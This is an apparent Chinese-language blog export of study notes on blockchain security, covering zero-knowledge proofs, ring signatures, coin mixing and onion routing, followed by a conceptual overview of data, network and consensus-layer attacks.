<p>可以用来获取目标网站web容器，操作系统，ip地址，是否有某cms指纹等等信息</p>
<p><strong>JSFinder</strong></p>
<p>可以用来从网站js里面提取敏感接口和子域名</p>
<p><strong>nmap</strong></p>
<p>可以用来进行端口扫描以及探测存活主机</p>
<p><strong>awvs</strong></p>
<p>用来进行漏洞扫描</p>
<p><strong>xray</strong></p>
<p>可以直接用来进行漏洞扫描</p>
<h4 id="关于审计"><a href="#关于审计" class="headerlink" title="关于审计"></a>关于审计</h4><p><strong>phpstorm</strong></p>
<p>既然要审计代码，那么要有一款好的ide，如phpstrom、vscode等，结合Xdebug方便跟踪调试代码</p>
<p><strong>rips</strong></p>
<p>rips能够自动审计，给出一些可能存在漏洞的地方以及漏洞类型，然后人为去验证判断，能减少很多审计时间</p>
<p><strong>Seay源代码审计系统</strong></p>
<p>类似于rips也是一款自动审计工具</p>
<h2 id="八-隐私威胁与保护"><a href="#八-隐私威胁与保护" class="headerlink" title="八.隐私威胁与保护"></a>八.隐私威胁与保护</h2><h3 id="隐私保护技术"><a href="#隐私保护技术" class="headerlink" title="隐私保护技术"></a>隐私保护技术</h3><p>隐私保护技术是指一系列用于保护用户隐私信息安全的技术手段，主要包括加密技术、身份识别技术、数据去标识化技术等。隐私保护技术的发展在一定程度上可以保护个人隐私信息免受不法侵害，起到保障用户权益和数据安全的作用。</p>
<p>具体来说，隐私保护技术发展的作用包括：</p>
<p>   <strong>数据加密保护</strong>：通过加密技术，对数据进行加密后再传输，可以有效防止数据在传输过程中被窃取或篡改。</p>
<p>   <strong>匿名化处理</strong>：通过数据去标识化技术，将用户的个人信息和身份与特定的行为或数据解耦，从而保护用户的个人隐私。</p>
<p>   <strong>身份验证技术</strong>：使用生物特征识别、二次验证等技术确保用户的身份安全，防止非法用户冒充他人身份。</p>
<p>   <strong>隐私政策和控制</strong>：通过隐私政策和隐私控制工具，用户可以了解数据收集和使用情况，并自主选择是否分享个人信息。</p>
<p>   <strong>安全存储和访问控制</strong>：通过访问控制和安全存储技术，确保个人敏感信息只能被授权人员访问，避免数据泄露。</p>
<p>隐私保护技术涉及的密码技术内容主要包括同态加密、环签名技术、安全多方计算和零知识证明等。</p>
<h3 id="密码知识"><a href="#密码知识" class="headerlink" title="密码知识"></a>密码知识</h3><ol>
<li><h4 id="在区块链中应用"><a href="#在区块链中应用" class="headerlink" title="在区块链中应用"></a>在区块链中应用</h4></li>
</ol>
<p>​    同态加密首先运用在云计算和大数据中。对于区块链技术，<strong>同态加密也是很好的互补。使用同态加密技术，运行在区块链上的智能合约可以处理密文，而无法获知真实数据，极大地提高了隐私安全性。</strong></p>
<p>​    对于区块链网络用户来说，希望提交到区块链网络中的数据安全性能得以保证，尤其是重要敏感数据的安全性，应避免恶意的信息泄露和篡改。同态加密技术能够使用户的密文数据在区块链智能合约中密文运算，而非传统的明文运算。这样的优点是，用户将交易数据提交到区块链网络之前，可使用相应的加密算法对交易数据进行加密，数据以密文的形式存在，即使被攻击者获取，也不会泄露用户的任何隐私信息，同时密文运算结果与明文运算结果一致。</p>
<ol start="2">
<li><h4 id="同态加密在区块链中的具有如下应用："><a href="#同态加密在区块链中的具有如下应用：" class="headerlink" title="同态加密在区块链中的具有如下应用："></a>同态加密在区块链中的具有如下应用：</h4><p><strong>数据隐私保护</strong>：在区块链中，大量的交易和数据需要被记录和验证，而同态加密技术可以确保这些数据在被存储和共享时保持加密状态，仅有授权用户才能访问和运算。</p>
<p><strong>智能合约安全性</strong>：智能合约是区块链中一种自动执行合约的机制，同态加密可以用于保护智能合约中的敏感数据，确保合约的安全性和隐私性。</p>
<p><strong>隐私保护的数据共享</strong>：区块链上的数据共享有时需要保护数据的隐私性，而同态加密可以使多方在密文状态下共享和处理数据，以保护数据隐私。</p>
<p><strong>安全数据分析</strong>：利用同态加密技术，区块链可以实现对加密数据集合进行计算分析，避免泄露隐私信息的同时仍然可以获得有用的数据分析结果。</p>
</li>
</ol>
<h4 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a><strong>零知识证明</strong></h4><p>指的是<strong>证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的</strong>。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。</p>
<p><span style = "color: red;">零知识证明：零知识，即在证明的过程中不透露任何内情。通俗的来讲，就是既证明了自己想证明的事情，同时透露给验证者的信息为“零”。</span></p>
<p>证明举例</p>
<p>  （1）用户在系统注册时，系统不会保存用户的密码明文，而是保存了密码的哈希值；用户在登录系统时，只需要输入注册时的密码，系统会根据用户输入密码产生的哈希值与系统数据库保存的哈希值进行比对。如果一致，则系统认为——当前登录用户知道该账号的密码。</p>
<p>这样，用户不需要告诉网站密码，就能证明自己的身份。这其实就是一种零知识证明。</p>
<p>  （2）B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p>
<p>  （3）A要去公司实习，公司要求A在校所有功课没有挂科，才有资格加入公司。A虽然所有功课都没有挂科，但都在61、62左右徘徊；A不想让公司看到自己的成绩单，于是A委托学校开了一个证明：证明A在校所有功课全部及格。并交到了公司，加入了公司。</p>
<p>这样，A既没暴露自己的确切考试成绩，又向公司证明自己满足要求。这其实就是零知识证明。</p>
<p>4）A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天2人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。</p>
<p>   ①B把自己的私钥给A，A用这个私钥对某个数据加密，然后用B的公钥解密，如果正确，则证明对方确实是B。</p>
<p>   ②A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。</p>
<p>第二种方法属于零知识证明。</p>
<p><strong>零知识证明的特点：</strong></p>
<p> （1）隐私保护：零知识证明允许在不泄露敏感信息的前提下向他人证明某个主张的真实性，从而保护了个人的隐私和数据安全。</p>
<p> （2）不可伪造性：零知识证明要求证明者以一种无法被伪造的方式向验证者证明某个主张的真实性，确保了证明的可靠性和完整性。</p>
<p> （3）交互式验证：零知识证明通常需要证明者和验证者之间进行多轮的交互式通讯和计算，以确认证明的有效性。</p>
<p><strong>应用场景：</strong></p>
<p>（1）身份验证：用户可以使用零知识证明向服务提供者证明自己拥有正确的身份信息，而无需透露具体的个人信息。这有助于保护用户的隐私并防止身份盗窃。</p>
<p>（2）支付系统：在电子支付系统中，用户可以使用零知识证明向商家证明自己有足够的资金进行支付，而无需透露具体的账户余额或其他财务信息。这有助于保护用户的财务隐私并提高支付系统的安全性。</p>
<p>（3）知识产权保护：企业可以使用零知识证明来保护自己的知识产权，例如专利、商标或版权。他们可以证明自己拥有某个专利或商标的权利，而无需公开具体的专利内容或商标细节。</p>
<p>（4）区块链应用：零知识证明在区块链技术中也有着广泛的应用。例如，在加密货币交易中，用户可以使用零知识证明来证明自己拥有足够的加密货币进行交易，而无需透露具体的交易历史或地址余额等信息。这有助于提高交易的隐私性和安全性。</p>
<p><strong>应用实例：</strong></p>
<p>目前ZCASH（大零币）使用零知识机制来证明交易有效，在ZCASH中，摒弃了之前的UTXO方式，而是使用了一种基于UTXO，被称为NOTE（支票）的新方式代替。NOTE代表了当前账户对资产的支配权，与UTXO不同，账户余额的存储方式不再是“未消费的交易输出”，而是“未被作废的支票（NOTE）”；一个NOTE是由所有者公钥PK、所拥有金额V、和唯一区分支票的序列号r组成，表示为NOTE&#x3D;(PK， v， r)</p>
<p>   ZCash交易分为两类：透明地址交易和隐藏地址交易。透明地址交易的输入、输出直接是可见的NOTE信息；隐藏地址交易，输入和&#x2F;或输出的地址和金额是隐藏的。</p>
<p>   在ZCASH的隐藏地址交易中，交易的输入输出不再是明文的NOTE，而是NOTE的签发和废弃通知。如下图：</p>
<p><img src="https://s2.loli.net/2024/11/27/6jBk8FwCTzaYps9.png" alt="1.png"></p>
<p> 左侧代表的是“签发的新的NOTE”，右侧代表的是“作废的NOTE”。每次进行转账，就会把转账方的NOTE放到作废列表里，代表此NOTE已经作废，同时为收款方创建一张等额的NOTE。这样就实现了“资产的转移”，并且由于都是记录的NOTE的哈希值，因此并不知道被废弃的和新签发的NOTE的内容，这样就做到了隐藏交易双方及交易细节。</p>
<p>   <strong>矿工如何确认这些匿名交易？</strong></p>
<p>在矿工确认交易时，转账方会提供一个证明P，能够证明：转账方通过金额V、公钥PK、支票序列号r计算后的哈希值，与在签发列表中存在的哈希值一致，这足以证明转账方的NOTE存在。这样既没有泄露转账方的信息，又证明了NOTE存在。</p>
<p>   矿工确认NOTE存在后，就会在作废列表中查询，如果没有此笔NOTE的作废记录，则证明转账方NOTE有效（防止双花）。然后再在作废列表中，把当前NOTE的序列号哈希计算后的值记录在作废列表中，表明此笔NOTE已经作废，同时为收款方签发新的NOTE。</p>
<p>   至此，就可以在区块链中应用零知识证明来保护交易双方隐私了。</p>
<h4 id="环签名技术"><a href="#环签名技术" class="headerlink" title="环签名技术"></a>环签名技术</h4><p>环签名解决的问题是，我对你说了一句话，但是你只知道是某一群人中有人对你说了这句话，而不知道这群人里具体哪个人说的。简言之就是，我把自己藏进了人群里。环签名通过将实际签名者的公钥藏进一个公钥集合，来达到保护签名者身份的目的。</p>
<p><strong>环签名具有保护签名者隐私和身份匿名的特性，适用于需要保护参与者身份和行为隐私的场景。通过环签名技术，签名者能够在不暴露自己身份的情况下签署消息，确保数据的安全性和隐私性。</strong></p>
<p>环签名也被称为 CryptoNote，由群签名演化而来，典型的应用案例是<strong>门罗币</strong>。群签名是利用公开的群公钥和群签名进行验证的方案，其中群公钥是<strong>公开</strong>的，群成员可以生成群签名，验证者能利用群公钥验证所得群签名的正确性，但不能确定群中的正式签名者。可是群管理员可以撤销签名，揭露真正的签名者群签名，这是群签名的关键问题所在。</p>
<p>   环签名方案则去掉了群组管理员，不需要环成员之间的合作，<strong>签名者利用自己的私钥和集合中其他成员的公钥就能独立的进行签名，集合中的其他成员可能不知道自己被包含在了其中。</strong>这种方案的优势除了能够对签名者进行无条件的匿名外，环中的其他成员也不能伪造真实签名者签名。外部攻击者即使在获得某个有效环签名的基础上，也不能伪造一个签名。</p>
<ol>
<li><p>匿名性保护。环签名可以防止交易链上的身份追踪：在使用环签名进行交易签名时，签名者的身份被隐藏在一个成员固定大小的环中，无法被外部观察者追踪。因此，交易链上的身份追踪变得更加困难，保护了用户的交易隐私和身份隐私。并且签名者可以在一个匿名的环中签署交易，使得用户在区块链上的交易活动不会暴露其真实身份，提高了用户交易的匿名性。</p>
</li>
<li><p>数据隐私保护。环签名可以保护交易内容的机密性：环签名技术不仅可以保护用户的身份隐私，还能保护交易内容的机密性。即使区块链上的所有交易信息都是公开的，但通过环签名，交易内容仍然可以保持加密私密状态，不易被外部方获取。</p>
</li>
<li><p>抗审查性保护。环签名可以防止审核和审查：通过环签名技术，区块链中的交易可以在签署者身份的保护下完成，无法被审查者追踪。这使得黑客、监视者和第三方无法通过分析区块链中的信息来获取用户的隐私信息。</p>
</li>
<li><p>信任建立。环签名可以建立信任：通过提高用户的身份和数据隐私保护水平，环签名技术有助于建立用户和社区之间的信任关系。用户可以更加放心地在区块链上进行交易和参与各种智能合约活动</p>
</li>
</ol>
<h3 id="隐私威胁与保护"><a href="#隐私威胁与保护" class="headerlink" title="隐私威胁与保护"></a>隐私威胁与保护</h3><p><strong>数据泄露</strong>是指系统信息被未经授权的人或组织获取，这可能导致各种威胁问题。数据泄露引起隐私威胁的主要原因：</p>
<p>   网络安全漏洞：许多网站和应用程序可能存在安全漏洞，这些漏洞可能被黑客利用来窃取用户数据。</p>
<p>   人为错误：个人或组织在处理敏感信息时可能会犯错。</p>
<p>   恶意软件：病毒、间谍软件等恶意软件可以窃取系统的敏感数据。</p>
<p>   社交工程攻击：黑客通过欺骗手段诱使个人泄露自己的敏感信息，例如通过假冒的电子邮件或电话请求密码重置。</p>
<p>   不安全的网络连接：在公共Wi-Fi网络上进行敏感操作可能会导致数据被截获。</p>
<p>区块链面临的一些隐私威胁：</p>
<p>   交易信息隐私泄露：区块链上的交易信息，如发送者、接收者和交易金额，可能会被泄露。为了保护这些信息，可以采用混币、环签名和机密交易等技术。</p>
<p>   智能合约隐私漏洞：智能合约可能存在漏洞，如果被黑客利用，可能会导致系统崩溃或交易数据泄露。为了防范这一风险，可以采用零知识证明、多方安全计算、同态加密等技术来保护合约数据。</p>
<p>   链上数据隐私泄露：区块链上的交易数据虽然与用户身份信息分离，但仍有可能通过分析交易模式来追踪用户的身份。为了进一步保护隐私，可以采用账本隔离、私有数据和数据加密授权访问等解决方案。</p>
<p>以下从<strong>用户身份隐私、交易隐私、网络隐私、通信隐私</strong>几个方面分析区块链技术隐私泄露问题</p>
<h5 id="用户身份隐私"><a href="#用户身份隐私" class="headerlink" title="用户身份隐私"></a>用户身份隐私</h5><p>​	用户身份隐私主要是指交易双方的地址信息，其本质是双方公钥的哈希值。在早期时候，因为这种地址的匿名特性，交易的所有数据都是公开的。但随着技术的发展，可以通过拓扑学、社会学、统计学以及溯源技术等一系列知识，分析得到交易双方在现实世界的真实信息，用户的隐私信息更会受到极大的威胁。</p>
<p>   最常用的解决方案主要是混币机制，也就是将多笔交易混合在一起，切断加密货币中交易方与接收方的联系，提高加密货币的隐私性和匿名性。</p>
<p>混币过程的执行可以由可信第三方或者是某种协议执行，根据这种特性，混币机制也可分为基于中心化结点的混币机制和去中心化的混币机制。</p>
<p>   基于中心化的混币机制：其本质是单纯地将一笔资金在多个地址中多次转移，实现简单、易于操作，在现有的各类数字货币系统中具有极高的适用性。但中心化混币机制普遍存在额外收费和时延问题，第三方节点的可信度也得不到保证，以此也容易引发第三方盗窃资金、泄露混币过程的风险。盲签名技术虽然可以降低混币过程泄露的风险，但又会引起混币计算代价增高。</p>
<p>   去中心化的混币机制：整个过程由混币协议实现，不需要第三方节点的参与，能有效避免中心化混币机制出现的问题，可去中心化混币机制的计算成本要更高，服务效率也更加较为低下。而且这一种机制仍然不能说是绝对安全，比如无法保证所有参与混币的用户守信、混币用户信息易泄露、容易遭受拒绝服务攻击等等。门罗币（Monero）在混币机制中采用了环签名加密技术，虽然有效避免了上述风险，但混币过程却变得更加冗长。</p>
<p>智能合约漏洞也会导致用户隐私泄露。如果用户的敏感信息被不当地存储在智能合约中，一旦合约被攻击或者泄露，这些信息可能会暴露用户的身份和其他隐私数据；智能合约中的交易逻辑可能涉及用户的身份信息或其他敏感数据，一旦有人分析了智能合约的交易逻辑，就有可能通过相关信息识别用户。</p>
<p>   不当的方法会导致用户隐私泄露。如区块链上的数据共享特性可能导致用户的敏感数据被不当地分享给其他参与者，从而暴露用户的身份和隐私信息。如果用户在区块链上存储了未经加密的敏感信息，就容易被他人获取和解密，暴露用户的身份隐私。如果区块链平台缺乏明确的隐私保护协议，用户无法有效地保护自己的身份隐私。</p>
<p>为了解决上述隐私泄露问题，可采取以下措施：</p>
<p> （1）加密数据：在数据上链之前对敏感信息进行加密处理，确保只有授权方才能解密数据。</p>
<p> （2）匿名化处理：使用匿名地址进行交易，避免地址与用户身份关联。</p>
<p> （3）隐私保护协议：建立隐私保护协议，明确区块链上数据的使用和共享规则，保护用户隐私权益。</p>
<p> （4）技术改进：研发更安全的智能合约代码，及时修补漏洞，提高系统的安全性和隐私保护能力。</p>
<h5 id="用户交易隐私"><a href="#用户交易隐私" class="headerlink" title="用户交易隐私"></a><strong>用户交易隐私</strong></h5><p>​    在区块链数字货币起步较早的时候，数字货币仅仅是以数据链的方式从一个钱包直接转移到另一个钱包，其交易记录不做任何保护措施全部公开在区块链系统中。这样虽然有效防止了双重花费问题，但在隐私保护方面却有着极大的问题。然后又有人提出将交易数据的哈希值上链，数据本体仍然储存在链下的中心数据库。可这样一来区块链技术的防篡改、分布式特性就没有得到发挥，特别是线下数据库一旦发生存储丢失、数据损坏、单机故障等问题后还会导致系统的验证能力失效，从而引发一系列问题。    </p>
<p>后来又有人提出将交易数据链下加密后再上链，也就是通过对称方式加密数据，非对称加密方式加密对称密钥的方式。可这样的加密方式仍然存在一定缺陷，首先是加密过后的数据无法通过合约来进行数据的操作以及共享。然后就是加密密钥传递需要中心化机构的参与，双方的私密数据不透明，也无法通过区块链的共识来进行验证。  </p>
<p>​    还有一种方案是将交易数据直接进行非对称加密上链，但这种方案在很多时候也是不可行的，因为非对称加密算法主要适用于数据量较小时短数据的加密，对于交易数据这种长数据只有对称加密的性能才可以达到。但对称密钥加密数据又会存在密钥的协商问题。基于以上的问题，有人又提出了基于双重加密的交易隐私保护方法，在保证隐私数据安全性的同时，优化了加密方案，使性能得到了很好的提升。</p>
<p>举例：</p>
<p>假设用户 Alice 需要向 Bob 转账 1 个 ZEC，基于零知识证明操作过程：</p>
<p>（1）用户 Alice 会先将自己的这 1 个 ZEC 拆分成若干份，具体份数可以根据设置来定。</p>
<p>（2）大零币的公有链同时也会将其他交易输出与 Alice 的若干份 ZEC 进行混合拆分，最后从中取出合计为 1 个 ZEC 的若干份发送给 Bob 的收款地址。经过这条公有链一系列的“混币”过程，就使得包括交易地址和具体金额在内的交易信息具有很强的隐匿性。另外，从上述过程来看要实现匿名性，其所花费的计算资源就非常多，带来了大量的资源浪费，也导致了其可扩展性面临巨大挑战。</p>
<p>除此之外还有同态加密、零知识证明、数据隔离、属性加密等解决方案。</p>
<h5 id="网络隐私"><a href="#网络隐私" class="headerlink" title="网络隐私"></a><strong>网络隐私</strong></h5><p>​    网络隐私主要分为节点隐私以及通信隐私。节点隐私主要内容有服务器地理位置、节点的物理信息、系统版本、节点 IP 等。在区块链上每一个节点的安全防护能力都是不同的，再加上区块链是一个对等网络，攻击者想要获取链上被保护的数据比起中心化数据库还可能更简单一些。对公有链来说，任意节点都可以接入，攻击者也可以通过监听、扫描技术等对整个网络进行探测攻击。甚至有人通过这些方式获取了大量的比特币节点信息，然后绘制出整个比特币系统的网络拓扑，再与溯源技术结合，用户的数据隐私将受到严重威胁。</p>
<p>通信隐私主要内容包括数据流量、节点间数据明文及密文等。虽然如今的加密货币很多都采用了ZK-SNARK 或者是环签名等先进密码学技术，但攻击者仍可以利用旁道攻击技术，破坏交易的不可连接性、机密性、不可追溯性、匿名性等。如今，对于这类隐私威胁，常采用的解决方案有可行第三方转发、混合网络、洋葱网络、大蒜路由、雷电网络、闪电网络等。</p>
<p>​    洋葱网络：主要由洋葱路由组成，使攻击者获取全局信息的难度大大增加，极大地降低了通信隐私泄露威胁。特别是第二代洋葱路由的出现，进一步优化了洋葱网络，其实用性也变得更强。</p>
<p>​    闪电网络：这是为达到链下通道隔离机制所使用的一种技术，主要目的是解决区块链上高频小额支付不便问题。其网络运行主体在区块链链下，实现了高频小额交易的同时，还提高了用户交易隐私安全性，对整个区块链技术来说，其拓展性有一步增强。</p>
<p>洋葱网络是一种在计算机网络上进行匿名通信的技术。通信数据先进行多层加密然后在由若干个被称为洋葱路由器组成的通信线路上被传送。每个洋葱路由器去掉一个加密层，以此得到下一条路由信息，然后将数据继续发往下一个洋葱路由器，不断重复，直到数据到达目的地。这就防止了那些知道数据发送端以及接收端的中间人窃得数据内容。</p>
<p>大蒜路由（Garlic routing）是洋葱路由的一个变体，它将传输的原始数据拆散为加密数据包通过多条隧道交叉疏散传递，令攻击者的流量分析难上加难。在洋葱路由中一条或多条数据流的上传与下载共用一条隧道，而这种路由方式的上传与下载隧道相互独立而且两个方向上的隧道数量都可能&gt;1，所以被称为大蒜路由。令攻击者的流量分析难上加难。</p>
<p>闪电网络为解决比特币拥堵而生，当然也可以用于其他区块链项目，比如我们上篇说的OMG。不过，以太坊也有自己的“闪电网络”，它的名字叫雷电网络。甚至，以太坊除了雷电网络，还有其他类似的技术。我们可以把闪电网络、雷电网络及其他类似技术，统称为“状态通道技术”。</p>
<p>我们回顾下闪电网络的原理就知道，双方构建一条通道，然后双方的状态（在比特币里，仅为账户余额）在通道里刷新，通道关闭后，再将最终状态记录到区块链上。所以，状态通道这个名字还是挺贴切的。从这里可以看出，所有的状态通道技术，仅仅是把区块链当做最后的记录手段，而在平时尽量避免“上链”。</p>
<p>继闪电网络后，今天我们稍微来了解下以太坊的雷电网络。</p>
<p>在比特币那里，闪电网络只是一个单纯的技术，但以太坊的雷电网络是一个有自己代币（RDN）的ICO项目。从技术上来说，发不发代币并无区别，所以V神也曾质疑过RDN的必要性。不过从通证经济的角度来看，也许有妙用。不过，咱们这里仅了解其技术。</p>
<p>因为以太坊是一个图灵完备的智能合约平台，很多复杂的工作以太坊在底层就已完成了，所以雷电网络的实现其实比闪电网络更简单。雷电网络不像闪电网络，必须依赖多重签名地址予以实现，而是直接靠以太坊的智能合约来实现：</p>
<p>第一步：在以太坊上布署一个智能合约，理论上来说，既可以每建一个通道，就布署一个合约，也可以为一种代币布署一个合约。前者实现比较简单，但耗费gas太多，后者实现起来复杂一点，但便宜一些。</p>
<p>第二步：通道双方将一定量的代币发送到合约地址进行锁定，构建资金池，在闪电网络那，由多重签名地址代持代币，而在雷电网络，则由合约地址代持。同时，双方会向合约发送一条双方签名的报文，这条报文的作用是向全网公示，通道双方各自锁定了多少代币。到此时为止，通道便建立起来了。</p>
<p>第三步：通道建立后，双方所有的交易都可以在链下进行。举个例子：比如A和B建立了雷电通道，双方最初各自锁定了10个以太币，现在A要转1个以太币给B，那么双方一起签名一条新的信息：A减去1个以太币，B增加1个以太币（闪电通道的是记录余额，雷电通道的是记录净增减，比如A再发1个以太币给B，闪电通道会记录A还有8个，B有12个，但雷电通道会记录A减少2个，B增加2个）。这条信息不需要发到区块链上，只需A和B保留就行。</p>
<p>第四步：A和B之间在链下的每一次双方签名的转账信息，都有一个序列号，比如第一次是1，第二次是2，如果要结束通道（假如A发起 ），A可以将最新的，也就是序列号最大的那个信息发送到智能合约，同时提供一个锁定时间。如果在锁定时间到期前，B提供了一个更新的信息，那说明A作弊（比如，A在倒数第二条信息时收到了B的1个以太币，在最后一条信息发给B两个以太币，但A结束通道时，只提交倒数第二条信息），合约会将锁定的币全部给B，用以惩罚A，如果到期时对方没有异议，合约根据最后这条信息的净增减额计算双方的最终余额并发还给他们。</p>
<h5 id="应用隐私"><a href="#应用隐私" class="headerlink" title="应用隐私"></a><strong>应用隐私</strong></h5><p>​    应用隐私一般分为用户端隐私与服务端隐私，隐私主要内容有支付流敏感信息、浏览器 Cookie、密钥存放位置等。</p>
<p>​	这一类隐私信息的泄露威胁其实并不来源于区块链技术本身，其主要问题还是在用户和服务商身上。用户的安全意识薄弱，在系统全线申请的时候往往会采用默认同意授权的方式。这样就给了第三方攻击者的操作空间，在对用户敏感信息进行收集之后，就可以通过一系列技术跟用户的身份产生映射关系，这样就能联系到用户的其他信息，造成严重的隐私泄露。而在攻击者收集信息之前，用户往往很难注意到自己暴露的哪些信息隐含着自己的敏感隐私，更不知道这些信息会被攻击者利用起来使自己的隐私信息全部暴露。</p>
<p>​    服务商暴露隐私的源头主要来自操作不当或者服务漏洞。就比如服务商授予用户的权限不匹配、服务商公开信息中隐含了敏感信息、插件存在漏洞等。对于这类隐私威胁，常用的解决方案有发布官方插件、身份认证、增强用户安全意识等。</p>
<p>为了有效保护用户端隐私和服务端隐私，可以采取以下一些措施：</p>
<p>   <strong>加密通信</strong>：确保用户端和服务端之间的通信是加密的，使用SSL&#x2F;TLS等协议来保护数据传输的隐私。</p>
<p>   <strong>隐私政策和协议</strong>：制定并明确公布隐私政策和服务协议，告知用户个人数据的收集、使用、存储、共享和保护方式，以及用户的权利和选择。</p>
<p>   <strong>匿名化处理</strong>：尽可能对用户端数据进行匿名化处理，避免直接暴露用户的身份信息。</p>
<p>数据加密：对敏感数据进行加密存储，确保只有授权人员可以解密访问。</p>
<p>​    <strong>访问控制</strong>：限制对用户端和服务端数据的访问权限，只允许有必要的人员能够访问和处理相关数据。</p>
<p>   <strong>安全审计</strong>：对系统和数据进行定期安全审计，及时发现潜在的风险和漏洞。</p>
<p><strong>更新维护</strong>：定期更新系统和应用程序，修复已知漏洞，以确保系统的最新安全性。</p>
<p>   <strong>数据备份与恢复</strong>：建立定期数据备份和灾难恢复机制，确保数据不会因故意破坏、意外删除或硬件故障而永久丢失。</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全基础四</title>
    <url>/2024/11/29/%E9%93%BE%E5%AE%894/</url>
    <content><![CDATA[<h2 id="八-区块链攻击与防御"><a href="#八-区块链攻击与防御" class="headerlink" title="八.区块链攻击与防御"></a>八.<strong>区块链攻击与防御</strong></h2><h3 id="安全威胁分析"><a href="#安全威胁分析" class="headerlink" title="安全威胁分析"></a>安全威胁分析</h3><ul>
<li>自身结构的复杂性和应用场景的多样性</li>
<li>恶意攻击者可能针对区块链应用的底层技术缺陷、低耦合性等安全漏洞展开攻击，从而非法攫取利益。</li>
</ul>
<p><strong>分类</strong>：</p>
<p><img src="https://s2.loli.net/2024/11/30/diXLKGDC8yabQsh.png" alt="1.png"></p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="数据层威胁"><a href="#数据层威胁" class="headerlink" title="数据层威胁"></a>数据层威胁</h4><p>数据层、网络层和共识层是区块链技术体系中最基础、最必要的3个层级，而<strong>数据层是其中最重要的一层</strong>，主要涉及区块链的数据结构、数字签名、哈希函数等密码学工具。这些密码学工具在保护区块链数据隐私的同时，其<strong>固有的碰撞攻击、后门攻击</strong>等安全问题也给区块链数据隐私带来了一定威胁。此外，攻击者也可能通过交易延展性攻击和恶意信息攻击破坏交易秩序和区块链网络环境。因此，<strong>区块链数据层面临的安全威胁主要包含数据隐私窃取和恶意数据攻击。</strong></p>
<p><strong>原因：</strong>区块链的数据层主要负责底层数据的存储，包括交易信息、区块头等关键数据。由于区块链的不可篡改性，一旦数据被写入，修改这些数据是极其困难的。然而，如果攻击者在数据层植入恶意信息或成功篡改已有数据，可能会对整个链的安全性造成威胁。</p>
<p><strong>类型：</strong>常见的数据层攻击包括<strong>51%攻击，</strong>通过控制大多数计算力来重写区块链历史；以及<strong>时间戳攻击</strong>，即通过操纵时间戳来影响区块的产生。</p>
<ol>
<li><p>密码算法的安全风险：如果使用的是低安全强度的密码算法，或者密码算法实现存在错误，那么区块链系统将容易受到攻击，导致数据被篡改或泄露。</p>
</li>
<li><p>数据结构逻辑错误：区块链的数据结构如果设计不合理，比如交易数据的树状组织不当，可能会导致解析错误，从而影响整个系统的稳定性和安全性。</p>
</li>
<li><p>数据隐私窃取：由于区块链的透明性特点，所有交易数据都是公开的，这可能导致用户隐私信息的泄露。因此，如何保护用户的隐私成为了一个重要的安全问题。</p>
</li>
<li><p>恶意数据攻击：区块链数据层可能会遭受恶意数据的注入，这些数据可能是为了破坏区块链的正常运行或者是企图篡改历史记录。</p>
</li>
<li><p>硬件安全：区块链系统通常依赖于特定的硬件环境，如果硬件存在安全漏洞，比如固件中的后门或硬件设备的物理损坏，也会影响到数据层的安全。</p>
</li>
</ol>
<p>采取有效的防御措施至关重要。例如，采用高强度的密码算法、确保数据结构的合理性和加强数据隐私保护措施</p>
<h4 id="网络层威胁"><a href="#网络层威胁" class="headerlink" title="网络层威胁"></a>网络层威胁</h4><p>   网络层是区块链技术体系中最基础的层级，主要包含<strong>P2P网络组网方式、消息传播协议等模块，赋予了区块链去中心化、不可删除、不可篡改的技术特性</strong>。区块链网络层面临的安全威胁主要是针对P2P网络的恶意攻击，攻击者可能通过漏洞植入、路由劫持、资源占用等方式扰乱区块链网络的正常运行，也有可能利用交易延迟攻击来破坏区块链网络交易环境。</p>
<p><strong>原因：</strong>网络层负责节点间的通信和数据传输。如果攻击者能够控制或干扰节点之间的通信，那么他们可以发起拒绝服务攻击（DoS），或者更隐蔽地修改传输中的数据，从而污染整个网络的信息。</p>
<p><strong>类型：</strong>网络层的攻击包括日蚀攻击，即隔离某些节点使其只与攻击者控制的节点通信；以及路由攻击，攻击者破坏或操纵网络的路由表来干扰数据传输。</p>
<h4 id="共识层威胁"><a href="#共识层威胁" class="headerlink" title="共识层威胁"></a><strong>共识层威胁</strong></h4><p>   共识层是区块链技术体系的核心架构。</p>
<p>其中的<strong>共识算法可以保证全网节点在去信任化的场景中对分布式账本数据达成共识，为区块链的去中心化、信任化提供了保障</strong>。</p>
<p>在授权共识机制中，各节点对共识过程的影响相同，所以易遭受女巫攻击；而在非授权共识机制中，各对等节点利用自身所持资源（如算力、权益）竞争记账权，进而达成共识。</p>
<p>投入的资源越多，则成功率越高，因此易遭受51%攻击。攻击者可能出于利益目的，通过贿赂攻击、币龄累计攻击等方式非法获取大量资源，从而发起51%攻击，以实现代币双花、历史修复、期货卖空、自私挖矿等目的。此外，攻击者还可以通过无利害关系攻击、预计算攻击等方式影响全网共识进程，进而获利。</p>
<p>共识层面临的安全威胁主要是，攻击者可以通过各种手段阻止全网节点达成正确的共识。</p>
<p>原因：共识层是区块链设计中的核心部分，它确保所有节点同意一份相同的数据记录。这一层的安全问题通常涉及操纵共识机制以达到非法获利或破坏系统的目的。</p>
<p>类型：自私挖矿是一种共识层的攻击方式，攻击者私下挖掘区块并隐瞒，直到能够获得比诚实节点更长的链时再公布，从而实现双花攻击。</p>
<hr>
<h5 id="关于女巫攻击"><a href="#关于女巫攻击" class="headerlink" title="关于女巫攻击"></a>关于女巫攻击</h5><p>   Sybil攻击，又称为女巫攻击，<strong>指一个恶意节点非法的对外呈现多个身份</strong>，通常把该结点的这些身份称为Sybil结点。Sybil攻击方式有以下几种类型：直接通信、间接通信、伪造身份、盗用身份、同时攻击、非同时攻击。</p>
